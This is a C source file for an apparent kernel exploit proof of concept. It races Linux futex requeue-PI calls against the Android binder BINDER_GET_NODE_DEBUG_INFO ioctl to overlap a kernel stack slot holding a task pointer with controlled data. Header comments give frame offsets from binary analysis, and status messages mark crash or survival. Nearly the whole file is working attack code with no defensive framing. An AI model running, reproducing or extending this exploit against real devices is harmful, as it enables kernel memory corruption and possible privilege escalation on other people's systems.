/**
 * ghostlock_binder_cfu.c — GhostLock + BINDER_GET_NODE_DEBUG_INFO stack CFU
 *
 * Static [BIN]:
 *   binder_ioctl frame 0xa0, CFU 0x18 @ SP+0x10
 *   nest 0xD0 → abs [0x160, 0x178)
 *   task @ 0x168 = buffer + 0x08 (binder_node_debug_info.cookie)
 *
 * Device: GET_NODE_DEBUG_INFO bad ptr → EFAULT (CFU proven).
 */
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#define BINDER_IOC(dir, nr, sz)                                                \
  (((dir) << 30) | ((sz) << 16) | (('b') << 8) | (nr))
#define BINDER_GET_NODE_DEBUG_INFO BINDER_IOC(3, 11, 24)

struct binder_node_debug_info {
  uint64_t ptr;
  uint64_t cookie; /* ← predicted waiter->task */
  uint32_t has_strong_ref;
  uint32_t has_weak_ref;
} __attribute__((packed));

static uint32_t f_wait __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain __attribute__((aligned(4096)));
static volatile int ready, owner_ok, done;
static int g_bfd = -1;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2,
                  uint32_t v3) {
  return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static void *waiter(void *a) {
  (void)a;
  g_bfd = open("/dev/binder", O_RDWR);
  if (g_bfd < 0) {
    printf("binder open errno=%d\n", errno);
    done = 1;
    return 0;
  }
  printf("[pre] binder fd=%d\n", g_bfd);

  futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
  ready = 1;
  while (!owner_ok)
    usleep(1000);

  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  ts.tv_sec += 8;
  long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
  printf("[waiter] WAIT_REQUEUE_PI ret=%ld errno=%d\n", r, errno);

  struct binder_node_debug_info info;
  memset(&info, 0, sizeof(info));
  info.ptr = 0;
  info.cookie = 0x4141414141414141ULL; /* task slot */
  info.has_strong_ref = 0;
  info.has_weak_ref = 0;

  printf("[binder] FIRING GET_NODE_DEBUG_INFO cookie=task pattern\n");
  errno = 0;
  r = ioctl(g_bfd, BINDER_GET_NODE_DEBUG_INFO, &info);
  printf("[binder] ioctl ret=%ld errno=%d %s\n", r, errno,
         r < 0 ? strerror(errno) : "OK");

  struct {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime, sched_deadline, sched_period;
    uint32_t sched_util_min, sched_util_max;
  } attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_nice = 5;
  errno = 0;
  r = syscall(274, 0, &attr, 0);
  printf("[pi] sched_setattr ret=%ld errno=%d\n", r, errno);
  attr.sched_nice = 0;
  syscall(274, 0, &attr, 0);

  close(g_bfd);
  futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
  done = 1;
  return 0;
}

static void *owner(void *a) {
  (void)a;
  futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
  owner_ok = 1;
  while (!ready)
    usleep(1000);
  usleep(400000);
  futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
  while (!done)
    sleep(1);
  return 0;
}

int main(void) {
  printf("ghostlock_binder_cfu — BINDER_GET_NODE_DEBUG_INFO vs task@-0x168\n");
  printf("CRASH => cover\n\n");
  f_wait = f_pi_target = f_pi_chain = 0;
  pthread_t wt, ot;
  pthread_create(&wt, 0, waiter, 0);
  usleep(200000);
  pthread_create(&ot, 0, owner, 0);
  usleep(300000);

  printf("[trigger] CMP_REQUEUE_PI...\n");
  for (int i = 0; i < 100; i++) {
    long r =
        futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    if (r >= 0) {
      printf("[trigger] GhostLock ret=%ld\n", r);
      break;
    }
    usleep(1000);
  }
  while (!done)
    sleep(1);
  pthread_join(wt, 0);
  pthread_join(ot, 0);
  printf("\n=== KERNEL SURVIVED ===\n");
  return 0;
}
